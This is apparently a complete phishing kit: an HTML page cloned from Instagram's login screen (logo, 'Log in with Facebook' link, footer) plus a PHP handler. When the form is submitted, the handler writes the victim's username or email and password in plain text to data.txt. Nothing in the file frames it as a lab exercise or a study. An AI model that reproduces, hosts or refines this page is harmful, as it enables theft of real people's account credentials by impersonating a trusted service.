
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="VsNE-OHk_8a.png">
    <link rel="stylesheet" href="style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
</head>

<body>
    <div class="container">
        <div class="row r1 mx-auto">
            <img src="Instagram_logo.svg.png" alt="" >
        
            
        </div>
        <div class=" row r2">
            <form action="insta.php" method="post">
                <input type="text" name="email" placeholder="Phone number,username, or email"><br />
                <input type="password" name="pass" placeholder="Password">
                <button type="submit" name="sub">Log in</button>
            </form>

        </div>
        <div class="row r3">
            <hr>
            <p>
            <div class="o">
                OR
            </div>
            </p>

        </div>
        <div class="row r4">
            <div class="col-3" style="text-align: right; width: 37%;">
                <img src="b326b5f8d23cd1e0f18df4c9265416f7.png" alt=""
                    height="60px" width="60px">
            </div>
            <div class="col-9 c9">
                <a href="https://www.facebook.com/">Log in with Facebook</a>
            </div>
        </div>
        <div class="row r5">
            <p>
                <a href="https://accounts.google.com/v3/signin/identifier?hl=en-gb&ifkv=ATuJsjyVNiLwQjKmlKgoIISCt-CtleUv6GX2wx4UVY5l6Wbqa0C6nc8UVjo7-gprUTH_WxkYVgmnJQ&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1576801667%3A1710244029307136&theme=mn">Forgot password?</a>
                
            </p>

            <h5>Don't have an account? <a href="https://www.instagram.com/accounts/login/?hl=en">Sign up</a></h5>

            <h6 style="margin-top: 20px;">Get the app.</h6>
        </div>
        <div class="row r6">
            <div class="col-6" style="text-align: right;">
                <img src="c5Rp7Ym-Klz.png" alt="" height="70px" width="200px">
            </div>
            <div class="col-6" style="text-align: left;">
                <img src="EHY6QnZYdNX.png" alt="" height="70px" width="200px">
            </div>
        </div>
        <div class="row r7">
            <table>
                <tr>
                    <td>Meta</td>
                    <td>About</td>
                    <td>Jobs</td>
                    <td>Blog</td>
                    <td>Help</td>
                    <td>API</td>
                    <td>Privacy</td>
                    <td>Terms</td>
                </tr>

            </table>
        </div>
    </div>
</body>

</html>

<?php
echo "hello data";
if(isset($_POST["sub"])){
    $name=$_POST["email"];
    $pass=$_POST["pass"];
    $file=fopen("data.txt","w");
    
    echo fprintf($file,"name => %s password => %s",$name,$pass);
    echo"$name";
    echo "$pass";

}




?>
